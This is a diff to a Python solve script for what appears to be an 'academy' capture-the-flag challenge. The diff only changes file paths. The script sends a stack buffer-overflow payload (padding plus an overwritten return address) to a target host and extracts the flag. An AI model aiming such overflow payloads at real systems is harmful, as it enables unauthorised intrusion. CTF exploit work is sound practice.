@@ -1,10 +1,10 @@
 ﻿import struct, socket, sys, time, re
 
-host, port = open(r"D:\ctf-index\_z_181url.txt").read().split()
+host, port = open(r"./_z_181url.txt").read().split()
 port = int(port)
 print("cible:", host, port, flush=True)
 
-stream = open('D:\\ctf-index\\_z_bizz_stream.bin', 'rb').read()
+stream = open('./_z_bizz_stream.bin', 'rb').read()
 head = stream[:-2]
 line = b" " + b"A" * 102 + struct.pack("<I", 0x8049206) + b"\n"
 inp = head + b"x" + line
@@ -31,4 +31,4 @@ print("tail:", out[-300:], flush=True)
 m = re.search(rb"academy\{[^}]*\}", out)
 print("FLAG:", m.group(0).decode() if m else None)
 if m:
-    open(r"D:\ctf-index\_z_181flag.txt", "w").write(m.group(0).decode())
+    open(r"./_z_181flag.txt", "w").write(m.group(0).decode())
